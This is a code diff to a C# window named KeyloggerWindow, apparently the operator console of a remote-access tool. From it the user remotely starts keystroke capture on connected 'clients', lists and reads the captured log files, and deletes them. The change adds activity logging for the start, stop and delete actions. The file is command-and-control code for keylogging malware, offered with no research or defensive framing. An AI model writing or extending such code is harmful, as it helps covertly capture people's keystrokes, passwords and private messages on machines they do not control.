@@ -1,4 +1,4 @@
-﻿using System.IO;
+using System.IO;
 using System.Windows;
 using System.Windows.Input;
 using System.Windows.Threading;
@@ -36,6 +36,8 @@ public partial class KeyloggerWindow : Window
             _server.UnregisterHandler(clientId, PacketType.KeyloggerFilesResult);
             _server.UnregisterHandler(clientId, PacketType.KeyloggerFileContent);
             _autoRefresh.Stop();
+            ServerWindow.ReportGlobalActivity("Keylogger stopped", _clientId, "complete");
+            ServerWindow.LogGlobal($"[KEYLOG] Keylogger stopped for client {_clientId}.");
         };
 
         // Auto-start capturing on open + load file list (staggered to avoid burst when many windows open)
@@ -45,6 +47,8 @@ public partial class KeyloggerWindow : Window
             await _server.SendToClient(_clientId, new Packet { Type = PacketType.KeyloggerStart });
             _capturing = true; UpdateBadge(); _autoRefresh.Start();
             await _server.SendToClient(_clientId, new Packet { Type = PacketType.KeyloggerListFiles });
+            ServerWindow.ReportGlobalActivity("Keylogger started", _clientId, "complete");
+            ServerWindow.LogGlobal($"[KEYLOG] Keylogger started for client {_clientId}.");
         };
     }
 
@@ -146,6 +150,8 @@ public partial class KeyloggerWindow : Window
             Type = PacketType.KeyloggerDeleteFile,
             Data = JsonConvert.SerializeObject(new KeyloggerGetFileData { Filename = vm.Filename })
         });
+        ServerWindow.ReportGlobalActivity("Delete keylog", vm.Filename, "complete");
+        ServerWindow.LogGlobal($"[KEYLOG] Deleted log file '{vm.Filename}' on client {_clientId}.");
         await Task.Delay(400);
         RequestFileList();
         TxtLog.Clear();
